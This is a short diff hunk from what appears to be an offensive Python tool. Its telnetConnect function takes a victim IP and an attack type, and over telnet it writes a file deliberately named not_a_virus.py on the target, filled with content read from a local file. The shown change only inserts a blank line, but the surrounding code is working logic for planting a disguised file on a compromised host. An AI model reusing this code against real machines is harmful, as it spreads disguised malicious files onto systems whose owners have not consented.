@@ -70,6 +70,7 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 str1.replace('111111', '10001')
                 file.close()
                 print("weszło: "+str1)
+
                 tn.write(b"touch not_a_virus.py\n")
                 tn.write(bytes('echo ' + '"' + str1 + '"' + '>>' + 'not_a_virus.py'+'\n', encoding="ascii"))
                 time.sleep(60)
